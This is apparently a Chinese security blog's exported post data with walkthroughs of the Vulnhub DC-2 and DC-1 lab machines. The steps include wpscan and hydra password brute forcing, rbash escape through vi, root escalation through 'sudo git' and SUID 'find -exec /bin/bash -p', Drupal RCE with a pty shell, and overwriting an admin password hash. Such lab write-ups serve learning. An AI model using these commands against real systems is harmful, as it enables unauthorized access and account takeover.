本地域名解析文件&#x2F;etc&#x2F;hosts主机名到IP地址的映射，优先级高于DNS 访问靶机IP，发现网址跳转，网址为dc-2，显然，计算机无法进行解析，所以我们要在攻击机上面修改本地域名解析文件&#x2F;etc&#x2F;hosts，添加:靶机IP dc-2 &#x2F;etc&#x2F;hosts 文件是一个操作系统中用于本地域名解析的静态配置文件，它的主要作用是将主机名（或域名）映射到对应的 IP 地址。 解析关系说明： 192.168.196.144 → 这是一个 IP 地址（通常是局域网内的某台服务器或设备）。 dc-2 → 这是你给该 IP 分配的 主机名（Hostname），相当于一个易记的别名。 域名解析作用： 当你在终端或浏览器访问 dc-2 时，系统会直接解析到 192.168.196.144，而无需通过 DNS 查询。 例如：测试生效方法如下一样 1ping dc-2 # 实际访问 192.168.196.144 dirsearch扫描并访问 cewl(生成密码)+wpscan(枚举用户名)&#x3D;wpscan(暴力破解)cewl—口令字典制作Cewl（Custom Word List generator）是一款用于爬取目标网站并生成自定义字典的工具，常用于密码破解（如暴力破解、字典攻击）。它通过分析网页内容提取关键词，生成适合目标特征的字典文件，提高破解效率。 主要功能 爬取网站内容：解析网页文本、链接、表单等。 生成字典文件：提取单词、数字、短语等，按频率或规则排序。 支持深度爬取：可递归扫描多级页面。 过滤优化：排除常见词、设置最小词长度、保留大小写等。 基本用法(kali自带)基础命令1cewl &lt;目标URL&gt; -w &lt;输出字典文件名&gt; 常用参数 参数 说明 -d &lt;深度&gt; 爬取深度（默认2） -m &lt;最小长度&gt; 单词最小长度（默认3） -o 包含文件名&#x2F;路径中的单词 --with-numbers 保留带数字的单词（如admin123） -a 提取元数据（如PDF、Word文档） -v 显示详细过程 示例： 1cewl http://example.com -d 3 -m 5 -w wordlist.txt --with-numbers WPScan (WordPress–CMS专用工具)WPScan 是一款专门针对 WordPress 网站的安全扫描工具，用于检测漏洞、枚举用户、插件&#x2F;主题信息，以及进行暴力破解等。它是基于 Ruby 开发的命令行工具，被广泛用于渗透测试和 WordPress 安全评估。 基本使用方法1. 扫描 WordPress 基本信息1wpscan --url &lt;目标网站&gt; 示例： 1wpscan --url http://example.com 这会检测 WordPress 版本、插件、主题等基本信息。 2. 枚举 WordPress 用户(此次测试用到)1wpscan --url &lt;目标网站&gt; -e(enumerate) u 3. 扫描插件漏洞1wpscan --url &lt;目标网站&gt; -e p 示例： 1wpscan --url http://example.com -e p 输出可能显示： 12[+] Enumerating Plugins (via Passive Methods) | plugin-name (v1.0) - Known Vulnerabilities: CVE-2023-XXXX 4. 扫描主题漏洞1wpscan --url &lt;目标网站&gt; -e t 示例： 1wpscan --url http://example.com -e t 输出可能显示： 12[+] Enumerating Themes (via Passive Methods) | theme-name (v2.0) - Known Vulnerabilities: CVE-2022-XXXX 5. 暴力破解 WordPress 登录(此次测试用到)1wpscan --url &lt;目标网站&gt; -P &lt;字典文件名&gt; -U &lt;用户名文件名&gt; ssh rbash(逃逸) rbash（Restricted Bash，受限 Bash）是 Bash Shell 的一种受限模式，旨在限制用户的操作权限，防止其执行某些可能影响系统安全的命令（如切换目录、设置环境变量、执行外部脚本等）。它通常用于： 增强安全性：限制普通用户或访客的 Shell 权限。 防止误操作：避免用户意外执行危险命令。 创建受控环境：例如在 FTP 账户、Git 账户或某些服务账户中使用。 ls &#x2F;home&#x2F;tom&#x2F;usr&#x2F;bin &#x2F;&#x2F;查看可用的命令bin 是 binary（二进制） 的缩写，在 Linux&#x2F;Unix 系统中用于存放 可执行程序（命令）。不同的 bin 目录用途不同，主要分为以下几类： 📂 常见的 bin 目录1. /bin（系统核心命令） 作用：存放系统启动和修复所需的 基础命令（所有用户可用）。 示例命令：ls, cp, mv, bash, cat。 路径：通常为 /bin（部分系统可能链接到 /usr/bin）。 2. /usr/bin（用户级命令） 作用：存放大多数 用户安装的应用程序和工具。 示例命令：python, gcc, vim, ssh。 路径：/usr/bin。 3. /usr/local/bin（本地安装的软件） 作用：存放用户 手动编译安装 的软件（避免覆盖系统自带命令）。 示例：通过 make install 安装的程序。 路径：/usr/local/bin。 4. /sbin 和 /usr/sbin（系统管理命令） 作用：存放需要 root 权限 的系统管理命令（如网络配置、磁盘管理）。 示例命令：ifconfig, iptables, fdisk。 路径：/sbin（核心命令）、/usr/sbin（非必要管理工具）。 5. ~/bin 或 ~/.local/bin（用户自定义命令） 作用：存放当前用户的 私有脚本或工具（仅对当前用户有效）。 示例：个人编写的 Shell 脚本、下载的第三方工具。 路径：/home/用户名/bin 或 /home/用户名/.local/bin。 绕过 rbash 的限制（安全风险）vi绕过： 可以进入vi中执行set命令将shell改为&#x2F;bin&#x2F;sh 利用编辑器： vi 进入之后直接在编辑的最底下依次输入如下命令： 121.:set shell=/bin/sh //给shell赋值2.:shell //执行shell 虽然以上操作更改了当前用户的操作权限，但是在当前这个路径并找不到flag3.txt文件，所以要设置全局变量才行 设置全局变量： 1export PATH=PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:sbin 保留原 PATH 并追加新路径（deepseek推荐）1export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/bin:/sbin 作用：在原有 PATH 基础上追加新目录，避免覆盖已有路径。 从flag3可以知道要用su命令切换jerry用户 su是 Linux&#x2F;Unix 系统中用于 切换用户身份 的核心命令，主要功能是临时以其他用户（通常是 root）的身份执行操作。 提权12345678sudo -l //授权查看git //开源分布控制系统操作命令如下：1. sudo git -p //-p是分页的功能2. :处改为!/bin/sh //shell转义，所以要避免sudo授权用户vi,vim,ftp.lee,more,git.......3. cd /root sudo -l 是 Linux&#x2F;Unix 系统中用于 列出当前用户被允许通过 sudo 执行的命令 的关键命令。它可以帮助你快速了解自己的权限范围，尤其是在多用户或受控环境中。新登录服务器时快速确认自己能做什么。 🔧 基本语法1sudo -l 需要输入当前用户的密码（不是 root 密码）。 输出结果会显示： 允许执行的命令路径。 是否需要密码（NOPASSWD 标签）。 其他限制条件（如环境变量、用户组等）。 cd /root 是一个 Linux&#x2F;Unix 命令，用于 切换到系统的 root 用户主目录（即 /root）。 📌 核心作用 进入 root 的主目录 /root 是超级用户（root）的专属家目录（普通用户的家目录是 /home/用户名）。 执行需 root 权限的操作 例如查看或修改 root 的配置文件（如 /root/.bashrc）。","categories":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://example.com/categories/Vulnhub/"}],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://example.com/tags/Vulnhub/"},{"name":"DC","slug":"DC","permalink":"http://example.com/tags/DC/"}]},{"title":"DC-1","slug":"DC-1","date":"2025-07-26T04:05:15.261Z","updated":"2025-11-01T07:45:15.386Z","comments":true,"path":"2025/07/26/DC-1/","permalink":"http://example.com/2025/07/26/DC-1/","excerpt":"","text":"扫描IP—得到靶机IP—查看靶机的端口—用浏览器打开页面查看有用的信息 1nmap -sn 192.168.196.0/24 是 Nmap 中用于 主机发现（Ping 扫描） 的命令，其作用是 快速探测 192.168.196.0&#x2F;24 网段中所有在线的主机，但不扫描端口或服务 1nmap -p- 192.168.196.142 是一条用于 全面端口扫描 的 Nmap 命令，其作用是 扫描目标主机 192.168.196.142 上的所有 65535 个 TCP 端口。 -p-◦ 表示扫描 所有 65535 个 TCP 端口（默认情况下，Nmap 仅扫描 1000 个常用端口）。◦ 等价于 -p 1-65535 扫漏洞 RCEremote command execution—RCE(远程代码执行漏洞),可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。 漏洞一个一个测试 漏洞利用成功一定会拿到对方的shell 用python指令来跟靶机实现交互页面：121.shell 2.python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; （这条指令的双引号跟单引号不能同时都是单引号，也不能同时为双引号，只能一种一个适配不然的话就会报错） Drupal的默认的配置文件在Drupal中，默认的配置文件路径是 sites&#x2F;default&#x2F;settings·php。这个文件的基本配置和数据库连接信息。 连接靶机的数据库 \\G在 MySQL&#x2F;MariaDB 命令行客户端中，\\G 是一个特殊的结束符，用于改变查询结果的显示格式。使用 \\G：将结果转换为垂直格式（每行一个字段），更易读，尤其适用于字段多或内容长的情况。 修改数据库密码正向解密是比较困难的，所以直接修改数据库里面的管理员密码即可，数据库里面可以修改密码的，不过是加密之后的密码—把简单密码通过靶机自带的脚本加密成哈希，然后把这个加密后的密码在靶机的数据库里面修改即可 12update users set pass=&quot;$S$DuJ6922k69Ln10FVDtVf.SPK2luCOA4py9YsHPkXW4x/lD7UH2mV&quot; where name=&#x27;admin&#x27;;&lt;.SPK2luCOA4py9YsHPkXW4x/lD7UH2mV&quot; where name=&#x27;admin&#x27;; 上面这个字符串用单引号跟双引号都可以 数据库里面的管理员密码修改成功之后直接在网页上面登录管理员用户即可 登录到后台 查看后台信息找到flag3 shadow文件–提取–find 123find / -perm -u=s -type f 2&gt;/dev/null | more1.find -name mysql -exec /bin/sh \\; 2.find -name flag1.txt -exec /bin/sh \\;最管用:find / -exec /bin/bash -p \\;(直接用这个) 这个命令尝试通过find命令执行shell： find -name flag1.txt - 在当前目录及子目录查找名为flag1.txt的文件 -exec /bin/sh \\; - 如果找到文件，就执行&#x2F;bin&#x2F;sh（启动一个shell） /bin/bash 和 /bin/sh 都是 Unix&#x2F;Linux Shell，但它们在功能、兼容性和行为上有一些区别： /bin/sh（Bourne Shell） 是 Unix 早期的标准 Shell，由 Steve Bourne 开发（1977年）。 功能较基础，不支持现代 Shell 的交互式特性（如命令行补全、历史记录等）。 /bin/bash（Bourne-Again Shell） 是 GNU 项目对 sh 的增强版，兼容 sh 并扩展了大量功能（如 tab 补全、数组、[[ ]] 条件判断等）。 目前大多数 Linux 发行版的默认交互式 Shell。 12345命令 cd ~flag4的作用是尝试切换到用户flag4的主目录（home directory）。详细解释：~（波浪号）在 Linux 中代表当前用户的主目录（如 /home/username）。~flag4表示用户flag4的主目录（通常是 /home/flag4 或 /var/lib/flag4，取决于系统配置）。cd ~flag4尝试进入该目录。 这个cd ~root——-cd: &#x2F;root—-是直接进入到&#x2F;root目录里面这个cd ~flag4——-cd: &#x2F;flag4—-是直接进入到&#x2F;flag4目录里面到此就结束了 法二：Hydra密码暴力破解 1hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.196.142 Hydra 对 IP 地址 192.168.196.142 的 SSH 服务进行暴力破解，具体参数如下： -l flag4：指定目标用户名是 flag4 -P /usr/share/wordlists/rockyou.txt.gz：使用 Kali Linux 自带的 rockyou.txt.gz 密码字典 ssh://192.168.196.142：攻击目标是 SSH 服务 ssh远程用hydra暴力破解对方靶机的登录账号密码之后就直接可以用ssh远程登录对方靶机了 1ssh flag4@192.168.196.142 尝试使用 SSH 登录到 192.168.196.142，用户名为 flag4 知道对方靶机的用户和密码的时候就可以直接在靶机上登录了","categories":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://example.com/categories/Vulnhub/"}],"tags":[{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://example.com/tags/Vulnhub/"},{"name":"DC","slug":"DC","permalink":"http://example.com/tags/DC/"}]}],"categories":[{"name":"春秋云镜.com","slug":"春秋云镜-com","permalink":"http://example.com/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-com/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/categories/SQL%E6%B3%A8%E5%85%A5/"},{"name":"Crypto","slug":"Crypto","permalink":"http://example.com/categories/Crypto/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://example.com/categories/NSSCTF/"},{"name":"vulnhub","slug":"vulnhub","permalink":"http://example.com/categories/vulnhub/"},{"name":"vulhub","slug":"vulhub","permalink":"http://example.com/categories/vulhub/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://example.com/categories/Vulnhub/"},{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"},{"name":"自制靶机","slug":"自制靶机","permalink":"http://example.com/categories/%E8%87%AA%E5%88%B6%E9%9D%B6%E6%9C%BA/"},{"name":"ctfshow-web-信息收集","slug":"ctfshow-web-信息收集","permalink":"http://example.com/categories/ctfshow-web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"},{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"},{"name":"ctfshow-web-文件上传","slug":"ctfshow-web-文件上传","permalink":"http://example.com/categories/ctfshow-web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"ctfshow-web-文件包含","slug":"ctfshow-web-文件包含","permalink":"http://example.com/categories/ctfshow-web-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"ctfshow-web-命令执行","slug":"ctfshow-web-命令执行","permalink":"http://example.com/categories/ctfshow-web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"ctfshow-web-爆破","slug":"ctfshow-web-爆破","permalink":"http://example.com/categories/ctfshow-web-%E7%88%86%E7%A0%B4/"},{"name":"Vulnvm靶机复现","slug":"Vulnvm靶机复现","permalink":"http://example.com/categories/Vulnvm%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"openfire","slug":"openfire","permalink":"http://example.com/tags/openfire/"},{"name":"SQLMAP","slug":"SQLMAP","permalink":"http://example.com/tags/SQLMAP/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"凯撒密码","slug":"凯撒密码","permalink":"http://example.com/tags/%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81/"},{"name":"维吉尼亚密码","slug":"维吉尼亚密码","permalink":"http://example.com/tags/%E7%BB%B4%E5%90%89%E5%B0%BC%E4%BA%9A%E5%AF%86%E7%A0%81/"},{"name":"RSA","slug":"RSA","permalink":"http://example.com/tags/RSA/"},{"name":"ftp","slug":"ftp","permalink":"http://example.com/tags/ftp/"},{"name":"python3.5","slug":"python3-5","permalink":"http://example.com/tags/python3-5/"},{"name":"x-forwarded-for的ip欺骗","slug":"x-forwarded-for的ip欺骗","permalink":"http://example.com/tags/x-forwarded-for%E7%9A%84ip%E6%AC%BA%E9%AA%97/"},{"name":"php提权root","slug":"php提权root","permalink":"http://example.com/tags/php%E6%8F%90%E6%9D%83root/"},{"name":"dirtycow","slug":"dirtycow","permalink":"http://example.com/tags/dirtycow/"},{"name":"drupal","slug":"drupal","permalink":"http://example.com/tags/drupal/"},{"name":"nohup","slug":"nohup","permalink":"http://example.com/tags/nohup/"},{"name":"WPA-01.cap","slug":"WPA-01-cap","permalink":"http://example.com/tags/WPA-01-cap/"},{"name":"aircrack-ng","slug":"aircrack-ng","permalink":"http://example.com/tags/aircrack-ng/"},{"name":"linpeas.sh","slug":"linpeas-sh","permalink":"http://example.com/tags/linpeas-sh/"},{"name":"les.sh","slug":"les-sh","permalink":"http://example.com/tags/les-sh/"},{"name":"rce","slug":"rce","permalink":"http://example.com/tags/rce/"},{"name":"poc","slug":"poc","permalink":"http://example.com/tags/poc/"},{"name":"flask","slug":"flask","permalink":"http://example.com/tags/flask/"},{"name":"Jinja2","slug":"Jinja2","permalink":"http://example.com/tags/Jinja2/"},{"name":"Cookie--GLOBALS","slug":"Cookie-GLOBALS","permalink":"http://example.com/tags/Cookie-GLOBALS/"},{"name":"docker交互式shell","slug":"docker交互式shell","permalink":"http://example.com/tags/docker%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/"},{"name":"状态码","slug":"状态码","permalink":"http://example.com/tags/%E7%8A%B6%E6%80%81%E7%A0%81/"},{"name":"越界读取","slug":"越界读取","permalink":"http://example.com/tags/%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96/"},{"name":"后面加.jpg后缀","slug":"后面加-jpg后缀","permalink":"http://example.com/tags/%E5%90%8E%E9%9D%A2%E5%8A%A0-jpg%E5%90%8E%E7%BC%80/"},{"name":"空格","slug":"空格","permalink":"http://example.com/tags/%E7%A9%BA%E6%A0%BC/"},{"name":"3个点","slug":"3个点","permalink":"http://example.com/tags/3%E4%B8%AA%E7%82%B9/"},{"name":"Nginx解析漏洞","slug":"Nginx解析漏洞","permalink":"http://example.com/tags/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"},{"name":"蚁剑","slug":"蚁剑","permalink":"http://example.com/tags/%E8%9A%81%E5%89%91/"},{"name":"GIF绕过","slug":"GIF绕过","permalink":"http://example.com/tags/GIF%E7%BB%95%E8%BF%87/"},{"name":"sqlmap","slug":"sqlmap","permalink":"http://example.com/tags/sqlmap/"},{"name":"JoomScan","slug":"JoomScan","permalink":"http://example.com/tags/JoomScan/"},{"name":"msfvenom","slug":"msfvenom","permalink":"http://example.com/tags/msfvenom/"},{"name":"basic认证爆破","slug":"basic认证爆破","permalink":"http://example.com/tags/basic%E8%AE%A4%E8%AF%81%E7%88%86%E7%A0%B4/"},{"name":"nikto","slug":"nikto","permalink":"http://example.com/tags/nikto/"},{"name":"put方法","slug":"put方法","permalink":"http://example.com/tags/put%E6%96%B9%E6%B3%95/"},{"name":"Rabbit","slug":"Rabbit","permalink":"http://example.com/tags/Rabbit/"},{"name":"vite","slug":"vite","permalink":"http://example.com/tags/vite/"},{"name":"任意文件读取漏洞(CVE-2025-30208)","slug":"任意文件读取漏洞-CVE-2025-30208","permalink":"http://example.com/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-CVE-2025-30208/"},{"name":"scp","slug":"scp","permalink":"http://example.com/tags/scp/"},{"name":"stegseek","slug":"stegseek","permalink":"http://example.com/tags/stegseek/"},{"name":"域控","slug":"域控","permalink":"http://example.com/tags/%E5%9F%9F%E6%8E%A7/"},{"name":"正向shell","slug":"正向shell","permalink":"http://example.com/tags/%E6%AD%A3%E5%90%91shell/"},{"name":"mysql_old_password","slug":"mysql-old-password","permalink":"http://example.com/tags/mysql-old-password/"},{"name":"lsattr--查看文件扩展属性","slug":"lsattr-查看文件扩展属性","permalink":"http://example.com/tags/lsattr-%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%B1%9E%E6%80%A7/"},{"name":"RUNPATH","slug":"RUNPATH","permalink":"http://example.com/tags/RUNPATH/"},{"name":"readelf","slug":"readelf","permalink":"http://example.com/tags/readelf/"},{"name":"ldd","slug":"ldd","permalink":"http://example.com/tags/ldd/"},{"name":"插件漏洞","slug":"插件漏洞","permalink":"http://example.com/tags/%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"http://example.com/tags/NSSCTF/"},{"name":"web源码泄露","slug":"web源码泄露","permalink":"http://example.com/tags/web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"},{"name":"ffuf","slug":"ffuf","permalink":"http://example.com/tags/ffuf/"},{"name":"Argon2Cracker","slug":"Argon2Cracker","permalink":"http://example.com/tags/Argon2Cracker/"},{"name":"fork解决断连","slug":"fork解决断连","permalink":"http://example.com/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/"},{"name":"ssh秘钥生成连接","slug":"ssh秘钥生成连接","permalink":"http://example.com/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/"},{"name":"提权!env_reset","slug":"提权-env-reset","permalink":"http://example.com/tags/%E6%8F%90%E6%9D%83-env-reset/"},{"name":"WAF","slug":"WAF","permalink":"http://example.com/tags/WAF/"},{"name":"suForce","slug":"suForce","permalink":"http://example.com/tags/suForce/"},{"name":"1Panel","slug":"1Panel","permalink":"http://example.com/tags/1Panel/"},{"name":"密码爆破","slug":"密码爆破","permalink":"http://example.com/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"},{"name":"cgi文件","slug":"cgi文件","permalink":"http://example.com/tags/cgi%E6%96%87%E4%BB%B6/"},{"name":"LFI到RCE(open函数)","slug":"LFI到RCE-open函数","permalink":"http://example.com/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/"},{"name":"Cypher注入","slug":"Cypher注入","permalink":"http://example.com/tags/Cypher%E6%B3%A8%E5%85%A5/"},{"name":"环境变量","slug":"环境变量","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"},{"name":"ghfs","slug":"ghfs","permalink":"http://example.com/tags/ghfs/"},{"name":"ssh弱口令爆破","slug":"ssh弱口令爆破","permalink":"http://example.com/tags/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/"},{"name":"url截断","slug":"url截断","permalink":"http://example.com/tags/url%E6%88%AA%E6%96%AD/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"sql二次注入","slug":"sql二次注入","permalink":"http://example.com/tags/sql%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"},{"name":"motto","slug":"motto","permalink":"http://example.com/tags/motto/"},{"name":"web文件上传","slug":"web文件上传","permalink":"http://example.com/tags/web%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/tags/ctfshow/"},{"name":"web文件包含","slug":"web文件包含","permalink":"http://example.com/tags/web%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"日志注入+ua添加木马","slug":"日志注入-ua添加木马","permalink":"http://example.com/tags/%E6%97%A5%E5%BF%97%E6%B3%A8%E5%85%A5-ua%E6%B7%BB%E5%8A%A0%E6%9C%A8%E9%A9%AC/"},{"name":"web命令执行","slug":"web命令执行","permalink":"http://example.com/tags/web%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"web爆破","slug":"web爆破","permalink":"http://example.com/tags/web%E7%88%86%E7%A0%B4/"},{"name":"Vulnvm","slug":"Vulnvm","permalink":"http://example.com/tags/Vulnvm/"},{"name":"Vulnhub","slug":"Vulnhub","permalink":"http://example.com/tags/Vulnhub/"},{"name":"DC","slug":"DC","permalink":"http://example.com/tags/DC/"}]}